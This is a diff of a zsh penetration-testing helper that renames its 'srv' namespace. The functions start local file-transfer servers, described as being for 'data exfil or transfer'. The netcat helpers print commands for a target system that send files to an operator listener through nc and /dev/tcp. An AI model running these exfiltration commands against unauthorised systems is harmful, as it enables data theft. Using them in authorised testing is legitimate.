@@ -1,49 +1,49 @@
 #!/usr/bin/env zsh
 
 ############################################################# 
-# qq-srv
+# nb-srv
 #############################################################
-qq-srv-help() {
+nb-srv-help() {
     cat << "DOC" | bat --plain --language=help
 
-qq-srv
+nb-srv
 -------
 The srv namespace provides commands for hosting local services
 such as web, ftp, smb and other services for data exfil or transfer.
 
 Commands
 --------
-qq-srv-install          install dependencies
-qq-srv-web              hosts a python3 web server in current dir
-qq-srv-ftp              hosts a python3 ftp server in current dir
-qq-srv-smb              hosts an impacket smb server in current dir
-qq-srv-tftp             starts the atftpd service in /srv/tftp
-qq-srv-smtp             hosts a python3 smtp server in current dir
-qq-srv-updog            hosts an updog web server in current dir
-qq-srv-nc-tar           hosts a netcat server > tar file in current dir
-qq-srv-nc-file          hosts a netcat server > file in current dir
-qq-srv-web-hosted       hosts a python3 web server in /srv, port as $1
-qq-srv-php-hosted       hosts a php web server in /srv, port as $1
-qq-srv-ftp-hosted       hosts a python3 ftp server in /srv
-qq-srv-updog-hosted     hosts an updog web server in /srv
+nb-srv-install          install dependencies
+nb-srv-web              hosts a python3 web server in current dir
+nb-srv-ftp              hosts a python3 ftp server in current dir
+nb-srv-smb              hosts an impacket smb server in current dir
+nb-srv-tftp             starts the atftpd service in /srv/tftp
+nb-srv-smtp             hosts a python3 smtp server in current dir
+nb-srv-updog            hosts an updog web server in current dir
+nb-srv-nc-tar           hosts a netcat server > tar file in current dir
+nb-srv-nc-file          hosts a netcat server > file in current dir
+nb-srv-web-hosted       hosts a python3 web server in /srv, port as $1
+nb-srv-php-hosted       hosts a php web server in /srv, port as $1
+nb-srv-ftp-hosted       hosts a python3 ftp server in /srv
+nb-srv-updog-hosted     hosts an updog web server in /srv
 
 DOC
 }
 
-qq-srv-install() {
+nb-srv-install() {
     __info "Running $0..."
     __pkgs netcat atftpd 
     __pkgs php python3 python3-pip python3-smb python3-pyftpdlib impacket-scripts
     sudo pip3 install updog
 }
 
-qq-srv-web() print -z "sudo python -m http.server 80"
-qq-srv-ftp() print -z "sudo python -m pyftpdlib -p 21 -w"
-qq-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
-qq-srv-tftp() print -z "sudo service atftpd start"
-qq-srv-smtp() print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
+nb-srv-web() print -z "sudo python -m http.server 80"
+nb-srv-ftp() print -z "sudo python -m pyftpdlib -p 21 -w"
+nb-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
+nb-srv-tftp() print -z "sudo service atftpd start"
+nb-srv-smtp() print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
 
-qq-srv-web-hosted() {
+nb-srv-web-hosted() {
     __info "Serving content from /srv"
     if [ "$#" -eq  "1" ]
     then
@@ -57,7 +57,7 @@ qq-srv-web-hosted() {
     fi
 }
 
-qq-srv-php-hosted() {
+nb-srv-php-hosted() {
     __info "Serving content from /srv"
     if [ "$#" -eq  "1" ]
     then
@@ -71,41 +71,41 @@ qq-srv-php-hosted() {
     fi
 }
 
-qq-srv-ftp-hosted() {
+nb-srv-ftp-hosted() {
     __info "Serving content from /srv"
     pushd /srv &> /dev/null
     sudo python3 -m pyftpdlib -p 21 -w
     popd &> /dev/null
 }
 
-qq-srv-updog() {
+nb-srv-updog() {
     print -z "updog -p 443 --ssl -p $(__rand 10)"
 }
 
-qq-srv-updog-hosted() {
+nb-srv-updog-hosted() {
     __info "Serving content from /srv"
     sudo updog -p 443 --ssl -d /srv
 }
 
-qq-srv-nc-tar() {
-    qq-vars-set-lhost
-    qq-vars-set-lport
+nb-srv-nc-tar() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
     __cyan "Use the command below on the target system: "
     echo "tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
     print -z "nc -nvlp ${__LPORT} | tar xfv -"
 }
 
-qq-srv-nc-file() {
-    qq-vars-set-lhost
-    qq-vars-set-lport
+nb-srv-nc-file() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
     __cyan "Use the command below on the target system: "
     echo "cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
     print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
 }
 
-qq-srv-nc-b64() {
-    qq-vars-set-lhost
-    qq-vars-set-lport
+nb-srv-nc-b64() {
+    nb-vars-set-lhost
+    nb-vars-set-lport
     __cyan "Use the command below on the target system: "
     echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
     print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
